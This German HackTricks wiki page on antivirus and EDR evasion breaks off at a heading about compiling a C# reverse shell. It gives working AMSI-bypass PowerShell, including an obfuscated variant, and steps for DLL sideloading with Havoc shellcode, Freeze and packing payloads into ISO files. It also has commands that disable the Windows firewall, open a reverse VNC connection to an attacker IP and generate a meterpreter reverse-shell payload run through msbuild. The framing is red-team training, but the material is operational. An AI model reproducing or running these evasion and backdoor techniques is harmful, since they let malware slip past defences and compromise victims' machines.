# Antivirus (AV) Umgehung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

**Diese Seite wurde von** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** geschrieben!**

## **AV-Evasionsmethodik**

Derzeit verwenden AVs verschiedene Methoden, um festzustellen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und für die fortschrittlicheren EDRs verhaltensbasierte Analyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch Markierung bekannter bösartiger Zeichenketten oder Byte-Arrays in einer Binär- oder Skriptdatei und durch Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Dies bedeutet, dass die Verwendung bekannter öffentlicher Tools Sie leichter entdecken kann, da sie wahrscheinlich analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

* **Verschlüsselung**

Wenn Sie die Binärdatei verschlüsseln, kann der AV Ihr Programm nicht erkennen, aber Sie benötigen einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

* **Verschleierung**

Manchmal reicht es aus, einige Zeichenketten in Ihrer Binär- oder Skriptdatei zu ändern, um sie am AV vorbeizubekommen, aber dies kann je nachdem, was Sie verschleiern möchten, zeitaufwändig sein.

* **Benutzerdefinierte Tools**

Wenn Sie Ihre eigenen Tools entwickeln, gibt es keine bekannten schlechten Signaturen, aber dies erfordert viel Zeit und Mühe.

{% hint style="info" %}
Eine gute Möglichkeit, die statische Erkennung von Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Wesentlichen in mehrere Segmente auf und fordert dann Defender auf, jedes einzelne Segment zu scannen. Auf diese Weise können Sie genau feststellen, welche Zeichenketten oder Bytes in Ihrer Binärdatei markiert sind.
{% endhint %}

Ich empfehle Ihnen dringend, diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) zur praktischen AV-Umgehung anzusehen.

### **Dynamische Analyse**

Die dynamische Analyse erfolgt, wenn der AV Ihre Binärdatei in einer Sandbox ausführt und nach bösartigen Aktivitäten sucht (z. B. Versuch, Ihre Browser-Passwörter zu entschlüsseln und zu lesen, Durchführung eines Minidumps auf LSASS usw.). Dieser Teil kann etwas schwieriger zu handhaben sein, aber hier sind einige Dinge, die Sie tun können, um Sandboxes zu umgehen.

* **Warten vor der Ausführung** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse des AVs zu umgehen. AVs haben nur sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen. Durch die Verwendung langer Wartezeiten kann die Analyse von Binärdateien gestört werden. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
* **Überprüfung der Ressourcen des Computers** In der Regel verfügen Sandboxes über sehr begrenzte Ressourcen (z. B. <2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Hier können Sie auch sehr kreativ sein, z. B. indem Sie die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten überprüfen. Nicht alles wird in der Sandbox implementiert sein.
* **Überprüfung spezifischer Maschinen** Wenn Sie einen Benutzer ins Visier nehmen möchten, dessen Arbeitsstation zur Domäne "contoso.local" gehört, können Sie eine Überprüfung der Domäne des Computers durchführen, um festzustellen, ob sie mit der von Ihnen angegebenen übereinstimmt. Wenn dies nicht der Fall ist, können Sie Ihr Programm beenden.

Es stellt sich heraus, dass der Computernamen der Sandbox von Microsoft Defender HAL9TH ist. Sie können also den Computernamen in Ihrer Malware vor der Detonation überprüfen. Wenn der Name HAL9TH entspricht, bedeutet dies, dass Sie sich in der Sandbox von Defender befinden, und Sie können Ihr Programm beenden.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zur Bekämpfung von Sandboxes

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir bereits in diesem Beitrag erwähnt haben, werden **öffentliche Tools** letztendlich **entdeckt**, daher sollten Sie sich folgende Frage stellen:

Wenn Sie beispielsweise LSASS dumpen möchten, **müssen Sie wirklich mimikatz verwenden**? Oder könnten Sie ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich letzteres. Nehmen wir mimikatz als Beispiel: Es ist wahrscheinlich eines der am häufigsten von AVs und EDRs markierten Schadprogramme, obwohl das Projekt selbst super cool ist, ist es auch ein Albtraum, damit um AVs herumzuarbeiten. Suchen Sie also nach Alternativen, um das zu erreichen, was Sie erreichen möchten.

{% hint style="info" %}
Wenn Sie Ihre Payloads zur Umgehung ändern, stellen Sie sicher, dass Sie die **automatische Musterübermittlung** in Defender **deaktivieren** und bitte, ernsthaft, **LADEN SIE NICHT ZU VIRUSTOTAL HOCH**, wenn Ihr Ziel darin besteht, langfristig eine Umgehung zu erreichen. Wenn Sie überprüfen möchten, ob Ihre Payload von einem bestimmten AV erkannt wird, installieren Sie ihn in einer VM, versuchen Sie, die automatische Musterübermittlung zu deaktivieren, und testen Sie ihn dort, bis Sie mit dem Ergebnis zufrieden sind.
{% endhint %}

## EXEs vs DLLs

Verwenden Sie immer, wenn möglich, **DLLs zur Umgehung**, in meiner Erfahrung werden DLL-Dateien in der Regel **viel weniger erkannt** und analysiert, daher ist es ein sehr einfacher Trick, den Sie in einigen Fällen verwenden können, um die Erkennung zu vermeiden (sofern Ihre Payload auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 in antiscan.me, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Vergleich von antiscan.me einer normalen Havoc EXE-Payload und einer normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir Ihnen einige Tricks, die Sie mit DLL-Dateien verwenden können, um viel unauffälliger zu sein.
## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem sowohl die Opferanwendung als auch bösartige Payloads nebeneinander positioniert werden.

Sie können Programme, die anfällig für DLL Sideloading sind, mithilfe von [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript überprüfen:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Dieser Befehl gibt eine Liste der Programme aus, die anfällig für DLL-Hijacking sind, die sich in "C:\Program Files\\" befinden, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle Ihnen dringend, **DLL-Hijackable/Sideloadable-Programme selbst zu erkunden**. Diese Technik ist ziemlich unauffällig, wenn sie richtig angewendet wird, aber wenn Sie öffentlich bekannte DLL-Sideloadable-Programme verwenden, könnten Sie leicht erwischt werden.

Es reicht nicht aus, einfach eine bösartige DLL mit dem Namen zu platzieren, den ein Programm zum Laden erwartet. Das Programm erwartet bestimmte Funktionen in dieser DLL. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL-Proxying/Forwarding**.

**DLL-Proxying** leitet die Aufrufe, die ein Programm von der Proxy- (und bösartigen) DLL aus macht, an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und Sie können die Ausführung Ihrer Payload steuern.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Folgende Schritte habe ich befolgt:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Der letzte Befehl gibt uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hier sind die Ergebnisse:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben eine Erkennungsrate von 0/26 in [antiscan.me](https://antiscan.me)! Das würde ich als Erfolg bezeichnen.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ich empfehle Ihnen dringend, [S3cur3Th1sSh1t's Twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG\_WNpE) anzusehen, um mehr über das zu erfahren, was wir ausführlicher besprochen haben.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe von angehaltenen Prozessen, direkten Systemaufrufen und alternativen Ausführungsmethoden`

Sie können Freeze verwenden, um Ihren Shellcode auf eine unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Evasion ist nur ein Katz-und-Maus-Spiel, was heute funktioniert, kann morgen erkannt werden. Verlassen Sie sich daher niemals nur auf ein Tool, sondern versuchen Sie, mehrere Evasionstechniken zu kombinieren, wenn möglich.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "fileless Malware" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen. Wenn Sie jedoch Payloads **direkt im Speicher** ausführen könnten, konnte der AV nichts tun, um dies zu verhindern, da er nicht genügend Sichtbarkeit hatte.

Die AMSI-Funktion ist in diese Komponenten von Windows integriert.

* Benutzerkontensteuerung, oder UAC (Erhöhung von EXE, COM, MSI oder ActiveX-Installation)
* PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
* Windows Script Host (wscript.exe und cscript.exe)
* JavaScript und VBScript
* Office VBA-Makros

Es ermöglicht Antivirenlösungen, das Verhalten von Skripten zu überprüfen, indem Skriptinhalte in einer Form freigelegt werden, die sowohl unverschlüsselt als auch nicht verschleiert ist.

Wenn Sie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` ausführen, wird Windows Defender den folgenden Alarm auslösen.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte abgelegt, wurden aber trotzdem im Speicher aufgrund von AMSI erwischt.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

* **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Ändern der zu ladenden Skripte eine gute Möglichkeit sein, um die Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu entschlüsseln, auch wenn sie mehrere Ebenen haben. Daher kann Verschleierung je nach Durchführung eine schlechte Option sein. Es ist also nicht so einfach zu umgehen. Manchmal reicht es jedoch aus, ein paar Variablennamen zu ändern, und schon ist man auf der sicheren Seite. Es hängt also davon ab, wie stark etwas markiert wurde.

* **AMSI-Bypass**

Da AMSI durch das Laden einer DLL in den PowerShell-Prozess (auch cscript.exe, wscript.exe usw.) implementiert wird, ist es auch als unprivilegierter Benutzer einfach möglich, damit zu manipulieren. Aufgrund dieser Schwachstelle in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Erzwingen eines Fehlers**

Das Erzwingen des Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass kein Scan für den aktuellen Prozess gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht und Microsoft hat eine Signatur entwickelt, um eine breitere Verwendung zu verhindern.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Alles, was es brauchte, war eine Zeile Powershell-Code, um AMSI für den aktuellen Powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst markiert, daher ist eine Modifikation erforderlich, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/\_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse für die Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingabe) und das Überschreiben mit Anweisungen, um den Code für E\_INVALIDARG zurückzugeben. Dadurch wird das Ergebnis des tatsächlichen Scans als sauberes Ergebnis interpretiert.

{% hint style="info" %}
Bitte lesen Sie [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.
{% endhint %}

Es gibt auch viele andere Techniken, die verwendet werden, um AMSI mit PowerShell zu umgehen. Schauen Sie sich [**diese Seite**](basic-powershell-for-pentesters/#amsi-bypass) und [dieses Repository](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

Oder dieses Skript, das über Memory Patching jedes neue Powershell-Skript patcht.

## Obfuscation

Es gibt mehrere Tools, die verwendet werden können, um C#-Klartextcode zu **verschleiern**, **Metaprogrammierungsvorlagen** zum Kompilieren von Binärdateien zu generieren oder **kompilierte Binärdateien zu verschleiern**, wie zum Beispiel:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Verschleierer**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Das Ziel dieses Projekts ist es, eine Open-Source-Version der [LLVM](http://www.llvm.org/)-Kompilierungssuite bereitzustellen, die durch [Code-Verschleierung](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) und Manipulationssicherheit die Software-Sicherheit erhöht.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie man `C++11/14` verwendet, um zur Kompilierungszeit verschleierte Code ohne Verwendung externer Tools und ohne Änderung des Compilers zu generieren.
* [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene verschleierter Operationen hinzu, die vom C++-Template-Metaprogrammierungsframework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binärverschleierer, der verschiedene pe-Dateien wie .exe, .dll, .sys verschleiern kann.
* [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige ausführbare Dateien.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feingranulares Code-Verschleierungsframework für LLVM-unterstützte Sprachen, das ROP (Return-Oriented Programming) verwendet. ROPfuscator verschleiert ein Programm auf der Assemblerebene, indem es reguläre Anweisungen in ROP-Ketten umwandelt und unser natürliches Konzept des normalen Kontrollflusses vereitelt.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, der in Nim geschrieben wurde.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in Shellcode umwandeln und dann laden.

## SmartScreen & MoTW

Sie haben möglicherweise diesen Bildschirm gesehen, wenn Sie einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer vor potenziell schädlichen Anwendungen schützen soll.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem Ruf-basierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und den Endbenutzer daran hindern, die Datei auszuführen (obwohl die Datei immer noch ausgeführt werden kann, indem auf Weitere Informationen -> Trotzdem ausführen geklickt wird).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet zusammen mit der URL, von der sie heruntergeladen wurden, erstellt wird.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

{% hint style="info" %}
Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signierungszertifikat signiert sind, **SmartScreen nicht auslösen**.
{% endhint %}

Eine sehr effektive Möglichkeit, zu verhindern, dass Ihre Payloads das Mark of The Web erhalten, besteht darin, sie in irgendeiner Form von Container wie einer ISO zu verpacken. Dies geschieht, weil Mark-of-the-Web (MOTW) auf **nicht-NTFS**-Volumes **nicht angewendet** werden kann.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabekontainer verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien verpackt werden, die [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) verwenden.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Das Laden von C#-Binärdateien im Speicher ist schon seit einiger Zeit bekannt und es ist immer noch eine sehr gute Möglichkeit, Ihre Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da der Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (Sliver, Covenant, Metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblys direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:

* **Fork\&Run**

Es beinhaltet das **Starten eines neuen Opferprozesses**, das Einspritzen Ihres bösartigen Post-Exploitation-Codes in diesen neuen Prozess, das Ausführen Ihres bösartigen Codes und das Beenden des neuen Prozesses, wenn er fertig ist. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung außerhalb unseres Beacon-Implantatprozesses erfolgt. Das bedeutet, dass wenn etwas bei unserer Post-Exploitation-Aktion schief geht oder erkannt wird, die **Chance viel größer ist, dass unser Implantat überlebt.** Der Nachteil besteht darin, dass die **Gefahr größer ist**, von **Verhaltenserkennungen** erkannt zu werden.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Es geht darum, den bösartigen Post-Exploitation-Code **in seinen eigenen Prozess** einzuspritzen. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil besteht darin, dass wenn bei der Ausführung Ihres Payloads etwas schief geht, die **Gefahr viel größer ist, Ihren Beacon zu verlieren**, da er abstürzen könnte.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Wenn Sie mehr über das Laden von C#-Assemblys erfahren möchten, lesen Sie bitte diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und ihre InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Sie können auch C#-Assemblys **aus PowerShell** laden, schauen Sie sich [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's Video](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem Sie der kompromittierten Maschine Zugriff **auf die Interpreter-Umgebung, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist**, geben.

Durch den Zugriff auf die Interpreter-Binärdateien und die Umgebung auf dem SMB-Share können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repository gibt an: Der Defender scannt immer noch die Skripte, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen nicht-obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## Fortgeschrittene Umgehung

Umgehung ist ein sehr komplexes Thema, manchmal müssen Sie viele verschiedene Quellen von Telemetrie in nur einem System berücksichtigen, daher ist es praktisch unmöglich, in ausgereiften Umgebungen vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle Ihnen dringend, diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einblick in fortgeschrittenere Umgehungstechniken zu erhalten.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Dies ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Umgehung in der Tiefe.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als bösartig erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das Teile der Binärdatei entfernt, bis es herausfindet, welchen Teil Defender als bösartig erkennt, und es Ihnen mitteilt.\
Ein weiteres Tool, das dasselbe tut, ist [**avred**](https://github.com/dobin/avred) mit einem öffentlichen Webangebot des Dienstes unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet-Server**

Bis Windows10 wurde jeder Windows mit einem **Telnet-Server** geliefert, den Sie installieren konnten (als Administrator) durch:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lassen Sie es **starten**, wenn das System gestartet wird, und **führen** Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändern Sie den Telnet-Port** (stealth) und deaktivieren Sie die Firewall:

Um die Erkennung zu erschweren, können Sie den Standard-Telnet-Port ändern. Dies kann erreicht werden, indem Sie den Port in den Einstellungen des Telnet-Servers auf einen anderen Wert als den Standardport 23 ändern.

Darüber hinaus können Sie die Firewall deaktivieren, um die Sicherheitsmaßnahmen weiter zu umgehen. Dies kann in den Firewall-Einstellungen vorgenommen werden, indem Sie die Firewall vorübergehend ausschalten. Beachten Sie jedoch, dass dies die Sicherheit Ihres Systems beeinträchtigen kann.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laden Sie es von [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) herunter (Sie möchten die binären Downloads, nicht das Setup).

**AUF DEM HOST**: Führen Sie _**winvnc.exe**_ aus und konfigurieren Sie den Server:

* Aktivieren Sie die Option _Disable TrayIcon_
* Legen Sie ein Passwort in _VNC Password_ fest
* Legen Sie ein Passwort in _View-Only Password_ fest

Verschieben Sie dann die Binärdatei _**winvnc.exe**_ und die neu erstellte Datei _**UltraVNC.ini**_ in das **Opfer**-System.

#### **Umgekehrte Verbindung**

Der **Angreifer** sollte innerhalb seines **Hosts** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er bereit ist, eine umgekehrte **VNC-Verbindung** zu empfangen. Dann, innerhalb des **Opfers**: Starten Sie den WinVNC-Dienst `winvnc.exe -run` und führen Sie `winwnc.exe [-autoreconnect] -connect <Angreifer-IP>::5900` aus.

**WARNUNG:** Um unentdeckt zu bleiben, dürfen Sie einige Dinge nicht tun:

* Starten Sie `winvnc` nicht, wenn es bereits läuft, da sonst ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Überprüfen Sie mit `tasklist | findstr winvnc`, ob es läuft.
* Starten Sie `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da sonst [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
* Führen Sie `winvnc -h` nicht für Hilfe aus, da sonst ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Laden Sie es von [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT) herunter.
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
In GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt starten Sie den Lister mit `msfconsole -r file.rc` und führen Sie das XML-Payload aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Verteidiger wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen Reverse-Shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Reverse-Shell

Kompilieren Sie es mit:
```
